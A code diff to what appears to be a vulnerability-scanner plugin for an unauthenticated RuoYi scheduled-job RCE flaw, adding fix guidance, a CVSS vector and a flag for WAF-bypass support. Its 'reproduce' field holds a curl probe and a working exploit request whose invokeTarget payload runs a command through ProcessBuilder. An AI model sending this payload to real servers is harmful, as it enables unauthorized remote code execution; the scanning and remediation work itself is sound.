@@ -8,7 +8,7 @@ from lib.matcher import match_positive
 
 class JobRcePlugin(PluginBase):
     name = '定时任务 RCE（未授权访问）'
-    cve = ''
+    cve = 'N/A'
     severity = 'high'
     category = 'vuln'
     description = (
@@ -19,6 +19,36 @@ class JobRcePlugin(PluginBase):
         '强制 /monitor/job/** 鉴权；白名单校验 invokeTarget 调用目标，禁止 ruoYiConfig 等敏感方法；'
         '后台路径接入统一鉴权框架'
     )
+    fix_detail = (
+        '【权限加固】为 /monitor/job/** 路径添加 @PreAuthorize("@ss.hasPermi(\'monitor:job:list\')")\n'
+        '【代码修复】SysJobController.edit() 添加 invokeTarget 白名单校验：\n'
+        '  String[] blacklist = {"ruoYiConfig","java.lang.Runtime","java.lang.ProcessBuilder"};\n'
+        '  for (String s : blacklist) { if (invokeTarget.contains(s)) throw new ServiceException("非法调用目标"); }\n'
+        '【升级方案】升级 RuoYi 至 4.7.0+（该版本对 invokeTarget 做了白名单校验）\n'
+        '【配置加固】quartz.properties 限制 JobDataMap 可序列化类：org.quartz.jobStore.allowNonManagedTxInJDBC=false\n'
+        '【WAF 规则】拦截 /monitor/job/edit 的 POST 请求含 invokeTarget 参数\n'
+        '【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验'
+    )
+    reproduce = (
+        '# 探测 /monitor/job/edit 是否未授权可访问（不修改任何任务）：\n'
+        'curl -X POST "http://target/monitor/job/edit" \\\n'
+        '  -d "jobId=99999&jobName=test&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile&cronExpression=0/10+*+*+*+*+?"\n'
+        '\n'
+        '# 预期响应（未授权可访问）：响应体含 "任务不存在" 类业务错误（而非登录页/401）\n'
+        '\n'
+        '# 实战利用（需 /monitor/job/edit 未鉴权，慎用，仅授权测试）：\n'
+        'curl -X POST "http://target/monitor/job/edit" \\\n'
+        '  -d "jobId=1&jobName=test&invokeTarget=org.springframework.cglib.core.ReflectUtils.invokeFn(\'new java.lang.ProcessBuilder(new String[]{\'id\'}).start()\'\n'
+        '  # 该 PoC 会触发 RCE，仅在授权靶场验证'
+    )
+    # D2：/monitor/job/edit 白名单在 4.7.0 收紧
+    affected_versions = '>=4.0,<4.7'
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
+    compliance = '等保2.0:8.1.3;OWASP:A03:2021'
+    # D7: WAF 绕过支持
+    vuln_type = 'rce'
+    supports_waf_bypass = True
 
     # 鉴权拦截关键字（命中即视为接口受保护，判 SAFE）
     AUTH_BLOCK_KEYWORDS = ['登录', '请先登录', 'unauthorized', '认证失败', '无法访问系统资源', 'signin', 'login']
